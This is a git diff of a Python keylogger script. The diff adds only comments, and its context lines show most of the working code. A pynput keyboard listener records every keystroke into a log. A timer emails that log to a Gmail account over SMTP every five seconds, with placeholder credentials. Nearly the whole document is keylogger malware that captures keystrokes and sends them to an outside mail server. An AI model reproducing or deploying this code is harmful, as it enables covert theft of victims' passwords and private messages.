@@ -6,13 +6,14 @@ import threading
 
 log = ""
 
+# Crete email function
 def send_mail(email, password, message):
 	server = smtplib.SMTP("smtp.gmail.com", 587)
 	server.starttls()
 	server.login(email, password)
 	server.sendmail(email, email, message)
 	server.quit()
-
+# create keylogger and make it easier to read
 def process_key_press(key):
 	global log
 	try:
@@ -45,7 +46,7 @@ def process_key_press(key):
 			log = log + ""
 		else:
 			log = log + " " + str(key) + " "
-
+# Generate report every 5 seconds
 def report():
 	global log
 	send_mail("Your email", "Your password", log)
@@ -53,7 +54,7 @@ def report():
 	timer = threading.Timer(5, report)
 	timer.start()
 
-
+# start keylogger and report functions
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
 with keyboard_listener:
 	report()
